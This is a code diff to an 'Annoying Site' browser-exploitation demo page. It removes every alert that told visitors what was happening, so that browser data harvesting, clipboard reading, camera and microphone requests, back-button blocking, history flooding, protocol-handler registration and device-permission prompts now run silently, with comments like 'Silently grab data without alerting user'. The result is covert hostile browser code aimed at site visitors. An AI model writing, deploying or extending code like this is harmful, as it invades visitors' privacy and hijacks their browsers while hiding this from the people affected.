@@ -364,28 +364,6 @@
             }
         }
 
-        // Alert Spam
-        function triggerAlerts() {
-            const alerts = [
-                '🚨 CRITICAL SYSTEM ERROR!',
-                '⚠️ WARNING: Your computer is infected!',
-                '💀 MEMORY CORRUPTION DETECTED!',
-                '🔥 FIRE IN THE HOLE!',
-                '💣 BOMB HAS BEEN PLANTED!',
-                '🎵 NEVER GONNA GIVE YOU UP!',
-                '🐱 CATS ARE TAKING OVER!',
-                '🌈 NYAN CAT FOREVER!',
-                '🎮 GAME OVER!',
-                '💩 POOP EMOJI SPAM!'
-            ];
-            
-            for (let i = 0; i < 5; i++) {
-                setTimeout(() => {
-                    alert(alerts[Math.floor(Math.random() * alerts.length)]);
-                }, i * 1000);
-            }
-        }
-
         // Fake Downloads
         function triggerDownloads() {
             for (let i = 0; i < 5; i++) {
@@ -456,14 +434,15 @@
                 timestamp: new Date().toISOString()
             };
             
-            alert('🔐 Browser Data Grabbed:\n' + JSON.stringify(data, null, 2));
+            // Silently grab data without alerting user
+            console.log('🔐 Browser Data Grabbed:', data);
             
-            // Try to access more sensitive data
+            // Try to access more sensitive data silently
             if (navigator.clipboard) {
                 navigator.clipboard.readText().then(text => {
-                    alert('📋 Clipboard content: ' + text);
+                    console.log('📋 Clipboard content:', text);
                 }).catch(() => {
-                    // Ignore errors
+                    // Ignore errors silently
                 });
             }
         }
@@ -476,7 +455,7 @@
             triggerCatPictures();
             triggerVideoSpam();
             triggerPopups();
-            triggerAlerts();
+            // triggerAlerts(); // Removed - no alerts wanted
             triggerDownloads();
             triggerSearchSpam();
             triggerLogout();
@@ -502,10 +481,7 @@
             registerProtocolHandlers();
             animateUrlWithEmojis();
             
-            // Additional chaos
-            setTimeout(() => {
-                alert('💀 FULL ANNOYANCE MODE COMPLETE! You have been thoroughly annoyed!');
-            }, 2000);
+            // No final alert - just pure chaos
         }
 
         // Individual download trigger
@@ -518,10 +494,7 @@
             link.click();
             document.body.removeChild(link);
             
-            // Also trigger some annoyance
-            setTimeout(() => {
-                alert(`📥 Downloading ${filename}... This might be annoying!`);
-            }, 500);
+            // No alert - just download
         }
 
         // Advanced Feature Functions
@@ -529,11 +502,11 @@
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ audio: true, video: true })
                     .then(stream => {
-                        alert('📷 Camera and microphone access granted!');
+                        // Silently access camera/mic
                         stream.getTracks().forEach(track => track.stop());
                     })
                     .catch(() => {
-                        alert('📷 Camera and microphone access denied!');
+                        // Silently fail
                     });
             }
         }
@@ -542,10 +515,10 @@
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText()
                     .then(text => {
-                        alert('📋 Clipboard content: ' + text);
+                        console.log('📋 Clipboard accessed:', text);
                     })
                     .catch(() => {
-                        alert('📋 Clipboard access denied!');
+                        // Silently fail
                     });
             }
         }
@@ -554,10 +527,10 @@
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen()
                     .then(() => {
-                        alert('🖥️ Fullscreen mode activated!');
+                        // Silently go fullscreen
                     })
                     .catch(() => {
-                        alert('🖥️ Fullscreen request denied!');
+                        // Silently fail
                     });
             }
         }
@@ -567,7 +540,7 @@
                 setInterval(() => {
                     navigator.vibrate([200, 100, 200]);
                 }, 2000);
-                alert('📳 Device vibration activated!');
+                // No alert - just vibrate
             }
         }
 
@@ -598,7 +571,7 @@
                     oscillator.stop();
                 }, 3000);
                 
-                alert('🎵 Theramin mode activated!');
+                // No alert - just play sound
             }
         }
 
@@ -606,7 +579,7 @@
             window.addEventListener('popstate', () => {
                 window.history.forward();
             });
-            alert('🔒 Back button blocked!');
+            // No alert - just block
         }
 
         function fillHistory() {
@@ -614,54 +587,78 @@
                 window.history.pushState({}, '', window.location.pathname + '?q=' + i);
             }
             window.history.pushState({}, '', window.location.pathname);
-            alert('📚 Browser history filled with annoying entries!');
+            // No alert - just fill history
         }
 
         function requestMidiAccess() {
             if (navigator.requestMIDIAccess) {
                 navigator.requestMIDIAccess()
-                    .then(() => alert('🎹 MIDI access requested!'))
-                    .catch(() => alert('🎹 MIDI access denied!'));
+                    .then(() => {
+                        // Silently request MIDI
+                    })
+                    .catch(() => {
+                        // Silently fail
+                    });
             }
         }
 
         function requestBluetoothAccess() {
             if (navigator.bluetooth) {
                 navigator.bluetooth.requestDevice({ acceptAllDevices: true })
-                    .then(() => alert('📶 Bluetooth access requested!'))
-                    .catch(() => alert('📶 Bluetooth access denied!'));
+                    .then(() => {
+                        // Silently request Bluetooth
+                    })
+                    .catch(() => {
+                        // Silently fail
+                    });
             }
         }
 
         function requestUsbAccess() {
             if (navigator.usb) {
                 navigator.usb.requestDevice({ filters: [] })
-                    .then(() => alert('💾 USB access requested!'))
-                    .catch(() => alert('💾 USB access denied!'));
+                    .then(() => {
+                        // Silently request USB
+                    })
+                    .catch(() => {
+                        // Silently fail
+                    });
             }
         }
 
         function requestSerialAccess() {
             if (navigator.serial) {
                 navigator.serial.requestPort()
-                    .then(() => alert('🔌 Serial access requested!'))
-                    .catch(() => alert('🔌 Serial access denied!'));
+                    .then(() => {
+                        // Silently request Serial
+                    })
+                    .catch(() => {
+                        // Silently fail
+                    });
             }
         }
 
         function requestHidAccess() {
             if (navigator.hid) {
                 navigator.hid.requestDevice({ filters: [] })
-                    .then(() => alert('⌨️ HID access requested!'))
-                    .catch(() => alert('⌨️ HID access denied!'));
+                    .then(() => {
+                        // Silently request HID
+                    })
+                    .catch(() => {
+                        // Silently fail
+                    });
             }
         }
 
         function requestWebauthnAttestation() {
             if (window.PublicKeyCredential) {
                 PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()
-                    .then(() => alert('🔐 WebAuthn attestation requested!'))
-                    .catch(() => alert('🔐 WebAuthn not available!'));
+                    .then(() => {
+                        // Silently request WebAuthn
+                    })
+                    .catch(() => {
+                        // Silently fail
+                    });
             }
         }
 
@@ -672,10 +669,10 @@
                     try {
                         navigator.registerProtocolHandler(proto, window.location.href + '/url=%s', 'The Annoying Site');
                     } catch (e) {
-                        // Ignore errors
+                        // Ignore errors silently
                     }
                 });
-                alert('🔗 Protocol handlers registered!');
+                // No alert - just register handlers
             }
         }
 
@@ -692,7 +689,7 @@
                 document.title = 'Advanced Browser Exploitation Toolkit - Educational Demo';
             }, 5000);
             
-            alert('✨ URL animation activated!');
+            // No alert - just animate
         }
 
         function closePopup() {
